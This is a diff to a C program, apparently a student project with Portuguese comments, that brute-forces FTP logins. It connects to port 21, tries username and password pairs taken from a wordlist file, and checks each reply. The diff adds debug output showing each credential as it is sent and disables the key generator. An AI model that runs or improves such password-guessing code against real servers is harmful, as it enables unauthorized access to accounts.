@@ -74,6 +74,7 @@ int match(char *username, char *password, char *ip){
     server.sin_family = AF_INET;
     server.sin_port = htons(21);
 
+    printf("\nConectando:\n");
     if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0){
         perror("");
         exit(1);
@@ -83,6 +84,9 @@ int match(char *username, char *password, char *ip){
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
 
+    printf("resp: %s\n",buffer);
+    
+    printf("enviando usuario: %s\n",username);
     //Enviado nome do usuario
     memset(buffer, '0', 1024);
     strcat(user, username);
@@ -92,6 +96,9 @@ int match(char *username, char *password, char *ip){
     //Resposta nome do usuario
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
+    
+    printf("resp: %s\n",buffer);
+    printf("enviando senha: %s\n",password);   
     
     //Enviado nome do pass
     memset(buffer, '0', 1024);
@@ -103,12 +110,16 @@ int match(char *username, char *password, char *ip){
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     
+    printf("resp: %s\n",buffer);
+    
+    //esse sleep é necessário?
     sleep(5);
     
     if(buffer[0] != error){
         achou = 1;
     }
     
+    printf("enviando QUIT\n");
     //Enviando comando 'QUIT'
     memset(buffer, '0', 1024);
     send(sock, quit, strlen(quit), 0);
@@ -116,7 +127,7 @@ int match(char *username, char *password, char *ip){
     //Resposta do 'QUIT'
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
-    printf("%s", buffer);
+    printf("resp: %s", buffer);
 
     if(sock >= 0){
         close(sock);
@@ -131,7 +142,7 @@ int bruteforce(unsigned int lenKey, char *ip, char *username, char *password){
     int i = 0, result = 0, achou = 0;
     FILE *file;
     
-    keyGenerator(lenKey);
+    //keyGenerator(lenKey);
     
     file = fopen("chaves.txt","r");
     if(file == NULL){
@@ -142,6 +153,7 @@ int bruteforce(unsigned int lenKey, char *ip, char *username, char *password){
     for(i = 0; i < TAM_LOGIN && !achou; i++){
         while(!feof(file) && !achou){
             fscanf(file, " %s", pass);
+
             result = match(login[i], pass, ip);
             if(result){
                 strcpy(username, login[i]);
